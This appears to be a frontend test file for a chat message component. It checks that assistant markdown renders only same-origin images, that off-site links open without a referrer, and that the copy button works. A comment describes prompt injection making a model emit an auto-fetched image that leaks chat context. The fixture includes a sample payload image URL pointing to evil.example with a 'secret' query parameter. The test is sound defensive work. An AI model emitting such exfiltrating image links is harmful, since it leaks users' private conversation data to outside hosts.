import "@testing-library/jest-dom/vitest";
import { fireEvent, render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { TooltipProvider } from "@/components/ui/tooltip";
import { MessageBubble } from "../ChatMessage";

const copy = vi.hoisted(() => vi.fn<(text: string) => Promise<boolean>>());
const toastSuccess = vi.hoisted(() => vi.fn());
vi.mock("copy-to-clipboard", () => ({ default: copy }));
vi.mock("sonner", () => ({ toast: { success: toastSuccess } }));

vi.mock("react-i18next", async (importOriginal) => ({
  ...(await importOriginal<typeof import("react-i18next")>()),
  useTranslation: () => ({ i18n: { language: "en" }, t: (key: string) => key }),
}));

// Upstream #24716: a prompt injection can make the model emit an image the
// browser would fetch without a click, carrying chat context in its URL.
describe("assistant markdown", () => {
  const reply =
    "![leaked alt](https://evil.example/x.png?d=secret) " +
    "![local](/api/events/abc/thumbnail.webp) " +
    "[offsite](https://evil.example/page) [home](/review)";

  const renderReply = () =>
    render(
      <TooltipProvider>
        <MessageBubble messageRole="assistant" content={reply} />
      </TooltipProvider>,
    );

  it("renders only same-origin images", () => {
    const { container } = renderReply();
    expect(screen.getByText(/leaked alt/)).toBeInTheDocument();
    const sources = Array.from(container.querySelectorAll("img")).map((img) =>
      img.getAttribute("src"),
    );
    expect(sources).toEqual(["/api/events/abc/thumbnail.webp"]);
  });

  it("opens off-origin links in a new tab without a referrer", () => {
    renderReply();
    const offsite = screen.getByRole("link", { name: "offsite" });
    expect(offsite).toHaveAttribute("target", "_blank");
    expect(offsite).toHaveAttribute("rel", "noopener noreferrer");
    const home = screen.getByRole("link", { name: "home" });
    expect(home).not.toHaveAttribute("target");
    expect(home).not.toHaveAttribute("rel");
  });
});

// copy-to-clipboard 4 resolves to whether the copy worked (F18).
describe("copy button", () => {
  const renderMessage = () =>
    render(
      <TooltipProvider>
        <MessageBubble messageRole="assistant" content="  Two cars today " />
      </TooltipProvider>,
    );

  it("copies the trimmed reply and confirms it", async () => {
    copy.mockResolvedValue(true);
    renderMessage();
    fireEvent.click(screen.getByRole("button", { name: "button.copy" }));
    expect(copy).toHaveBeenCalledWith("Two cars today");
    await vi.waitFor(() =>
      expect(toastSuccess).toHaveBeenCalledWith("button.copiedToClipboard"),
    );
  });

  it("does not confirm a copy the browser refused", async () => {
    copy.mockResolvedValue(false);
    renderMessage();
    fireEvent.click(screen.getByRole("button", { name: "button.copy" }));
    await vi.waitFor(() => expect(copy).toHaveBeenCalledTimes(1));
    await Promise.resolve();
    expect(toastSuccess).not.toHaveBeenCalled();
  });
});
